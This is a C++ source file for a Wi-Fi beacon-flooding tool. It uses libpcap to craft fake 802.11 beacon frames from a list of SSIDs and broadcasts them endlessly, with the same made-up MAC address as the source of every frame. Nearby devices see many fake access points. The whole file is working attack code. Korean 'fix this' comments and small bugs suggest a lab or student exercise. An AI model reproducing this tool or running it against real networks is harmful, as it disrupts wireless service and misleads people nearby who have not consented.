#include "CBeaconFlood.h"

CBeaconFlood::CBeaconFlood(ST_PARAM parameter) : param(parameter)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap = pcap_open_live(param.dev, 0, 0, 0, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev, errbuf);
        exit(1);
	}

}

CBeaconFlood::~CBeaconFlood(){

	for(u_char* i : vecPacketInfo){
		delete i;
	}
    pcap_close(pcap);  
}


int CBeaconFlood::beaconFlood()
{
	
	readSsidList();
	for(std::string ssid : vecSsidList)
	{
		makePacket(ssid);
	}
	while(1)
	sendPacket();

    return 0;

}

void CBeaconFlood::readSsidList()
{
	std::fstream readFile;
    readFile.open(param.ssidListFile);   

    if (!readFile.is_open())
    {
		std::cout << "file can't open" <<std::endl;
		return;
	}

    while (!readFile.eof())
    {
        std::string strSsid;
        getline(readFile, strSsid);
		vecSsidList.push_back(strSsid);
        std::cout << "ssid:" <<strSsid << std::endl;    
    }
	
    readFile.close();   
    
}


void CBeaconFlood::makePacket(std::string ssid)
{

	u_int8_t packetLength = 0;
	u_char * packet = new u_char[sizeof(ST_WIRELESS_PACKET)+sizeof(ST_TAG_DS_PARAMETER)+sizeof(ST_TAG_SSID_PARAMETER)+ssid.length()];
	ST_WIRELESS_PACKET * wirelessPacket = (ST_WIRELESS_PACKET*)packet;

	wirelessPacket->radioTapHeader.version = 0x00;
	wirelessPacket->radioTapHeader.pad = 0x00;
	wirelessPacket->radioTapHeader.len = 0x18;
	wirelessPacket->radioTapHeader.present[0] = 0x2e; //고치기
	wirelessPacket->radioTapHeader.present[1] = 0x40;
	wirelessPacket->radioTapHeader.present[2] = 0x00;
	wirelessPacket->radioTapHeader.present[3] = 0xa0;
	wirelessPacket->radioTapHeader.present[4] = 0x20;
	wirelessPacket->radioTapHeader.present[5] = 0x08;
	wirelessPacket->radioTapHeader.present[6] = 0x00;
	wirelessPacket->radioTapHeader.present[7] = 0x00;
	wirelessPacket->radioTapHeader.flags = 0x00;
	wirelessPacket->radioTapHeader.dataRate = 0x02;
	wirelessPacket->radioTapHeader.channelFrequency = 0x096c;
	wirelessPacket->radioTapHeader.channelFlags = 0xa0;
	wirelessPacket->radioTapHeader.antennaSignal = -63;
	wirelessPacket->radioTapHeader.antenna = 0x00;
	wirelessPacket->radioTapHeader.rxFlags = 0x0000;
	wirelessPacket->radioTapHeader.antennaSignalT = -63; 
	wirelessPacket->radioTapHeader.antennaT =  0x00;
	wirelessPacket->beaconFrame.frameControl = 0x0080;
	wirelessPacket->beaconFrame.duration = 0x0000;
	wirelessPacket->beaconFrame.destinationAddr =  Mac("FF:FF:FF:FF:FF:FF");// MAC BD
	wirelessPacket->beaconFrame.sourceAddr =  Mac("11:22:33:44:55:66");// MAC any
	wirelessPacket->beaconFrame.bssid =  Mac("11:22:33:44:55:66"); // MAC any 
	wirelessPacket->beaconFrame.seqFragNum = 0x0000; 
	wirelessPacket->fixedParameter.timestamp[0] = 0xab; //고치기
	wirelessPacket->fixedParameter.timestamp[1] = 0x45;
	wirelessPacket->fixedParameter.timestamp[2] = 0x09;
	wirelessPacket->fixedParameter.timestamp[3] = 0xf7;
	wirelessPacket->fixedParameter.timestamp[4] = 0x28;
	wirelessPacket->fixedParameter.timestamp[5] = 0x00;
	wirelessPacket->fixedParameter.timestamp[6] = 0x00;
	wirelessPacket->fixedParameter.timestamp[7] = 0x00;								
	wirelessPacket->fixedParameter.beaconInterval = 0x6400;
	wirelessPacket->fixedParameter.capabilityInfo = 0x0011; 

	packetLength += sizeof(ST_WIRELESS_PACKET);
	u_char * fPointer = packet + packetLength;
	ST_TAG_DS_PARAMETER* tagDsParameter =  (ST_TAG_DS_PARAMETER*)fPointer;
	tagDsParameter->tagNumber = tagParameter::TAGDSPARAMETERSET;
	tagDsParameter->tagLength = 1;
	tagDsParameter->tagDsParameter = 1;

	packetLength += sizeof(ST_TAG_DS_PARAMETER);

	fPointer = packet + packetLength;
	ST_TAG_SSID_PARAMETER* tagSsidParameter = (ST_TAG_SSID_PARAMETER*)fPointer;

	tagSsidParameter->tagNumber = tagParameter::TAGSSIDPARAMETERSET;
	tagSsidParameter->tagLength = (u_int8_t)ssid.length();
	memcpy((void*)tagSsidParameter->ssid,ssid.data(),ssid.size());
	packetLength += sizeof(ST_TAG_PARAMETER) + tagSsidParameter->tagLength;	


	vecPacketInfo.push_back(packet);		
	vecPacketLength.push_back(packetLength);


}

void CBeaconFlood::sendPacket()
{
	// printf("%p\n",vecPacketInfo[0]);
	for(int i = 0 ; i < vecPacketInfo.size(); i ++){
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(vecPacketInfo[i]), vecPacketLength[i]);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}

	}
	sleep(0.0005);
}    
